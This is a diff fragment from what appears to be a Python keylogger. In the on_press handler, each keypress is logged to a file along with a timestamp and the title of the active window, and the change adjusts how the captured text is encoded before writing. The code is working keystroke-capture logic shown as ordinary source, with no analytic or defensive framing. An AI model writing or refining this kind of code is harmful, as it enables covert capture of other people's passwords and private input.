@@ -16,7 +16,7 @@ def on_press(key):
         x = datetime.datetime.now()
         try:
             str = x.strftime("%Y-%m-%d %H:%M:%S") + ":\t " + GetWindowText(GetForegroundWindow()).split(" - ")[len(GetWindowText(GetForegroundWindow()).split(" - ")) - 1]+ ":\t " + k + "\n"
-            f.write(str.encode('ascii', 'ignore'))
+            f.write(str.encode('ascii', 'ignore').decode('ascii'))
 
         finally:
             f.close()
